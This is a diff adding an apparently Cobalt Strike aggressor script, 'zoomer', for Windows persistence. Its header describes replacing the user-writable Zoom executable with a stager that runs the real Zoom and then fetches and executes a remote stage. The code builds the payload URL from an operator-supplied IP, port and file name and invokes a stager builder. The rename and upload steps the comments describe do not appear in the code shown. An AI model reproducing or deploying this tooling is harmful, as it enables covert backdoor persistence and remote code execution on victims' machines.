@@ -1,0 +1,63 @@
+# ###################################
+# 
+# Zoom Persistence via Symlink Abuse (S4R1N)
+#
+# Background: By default Zoom gets installed under a User's "AppData" directory 
+# (C:\Users\{USER}\AppData\Roaming\Zoom\) which is writeable by the user in question
+# if the Zoom executable located in the the Zoom "bin" directory gets replaced with  
+# another one. All the Symbolic links (short cuts) will point to this new exe.
+# 
+# Script Funcationality: This aggressor script calls a golang program (exe) set by user
+# to build a C stager to upload to victim machine. The Aggressor script then renames 
+# the pre-existing zoom executable to a generic name and uploads the freshly minted 
+# stager onto the victim system (under the zoom directory) with the file name "zoom.exe".
+# 
+# This stager will then run the Zoom Executable using its modified name and then pull the 
+# stage from the specified address and execute it.
+#
+# IMPORTANT: Modify the builder and compiler variables to point at the correct builder
+# and compiler executable names 
+#
+# Example Usage : zoomer 127.0.0.1 80 test 
+# 
+####################################
+
+# Modify this as needed
+$builder = "Builder.exe";
+$x86compiler = "cl.exe";
+$x64compiler = "cl.exe";
+
+command zoomer {
+
+    # Get Number of Args 
+    $size = size(@_);
+
+    # check size 
+    if ($size < 3 ) {
+    
+        println("\c8[+]\cF Usage: zoomer <IP> <PORT> <FILE>");
+    
+    } else {
+
+        # Splitting Arg Array to Respective Variables
+        $IP = @_[0];
+        $PORT = @_[1];
+        $FILE = @_[2];
+
+        # String Concatination via . Operator
+        $URL =  "http://" . "$IP" . ":" . "$PORT" . "/" . "$FILE";
+        
+        println("\c9[+]\cF Building Stager to fetch from $URL");
+
+        # Create process and waits forever until it ends :) 
+        $hProcess = exec("Builder.exe");
+        printAll(readAll($hProcess));
+        $retcode = wait($hProcess, 0); 
+
+        println("\c9[+]\cF Executed Command $retcode")
+
+
+    }
+
+
+}
